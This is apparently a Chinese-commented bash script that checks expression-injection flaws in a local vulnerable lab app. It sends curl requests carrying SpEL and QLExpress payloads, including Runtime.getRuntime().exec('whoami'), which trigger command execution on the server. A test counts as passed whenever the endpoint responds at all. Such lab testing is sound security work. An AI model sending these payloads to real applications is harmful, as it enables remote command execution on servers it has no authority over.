#!/bin/bash
# 表达式注入漏洞验证脚本

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}表达式注入漏洞验证脚本${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[测试 $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if [ $? -eq 0 ]; then
        echo -e "  ${GREEN}[✓] 端点响应${NC}"
        echo "  响应: $(echo "$response" | head -c 100)..."
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] 请求失败${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== 表达式注入测试 ===${NC}"

test_case "SpEL 表达式注入" \
    "${BASE_URL}/spel/vuln1?exp=T(java.lang.Runtime).getRuntime().exec('whoami')" \
    ""

test_case "SpEL 高级注入" \
    "${BASE_URL}/spel/vuln2?exp=\${new java.lang.String('exploited')}" \
    ""

test_case "QLExpress 注入" \
    "${BASE_URL}/qlexpress/vuln?exp=com.vulnlab.Utils.exec('whoami')" \
    ""

# 信息端点
echo -e "\n${YELLOW}[*] 表达式注入信息端点:${NC}"
info=$(curl -s "${BASE_URL}/spel/info" 2>/dev/null)
echo "$info" | head -10

# 总结
echo -e "\n${BLUE}========================================${NC}"
echo -e "总测试数: ${YELLOW}$TOTAL${NC}"
echo -e "通过: ${GREEN}$PASSED${NC}"
echo -e "失败: ${RED}$FAILED${NC}"
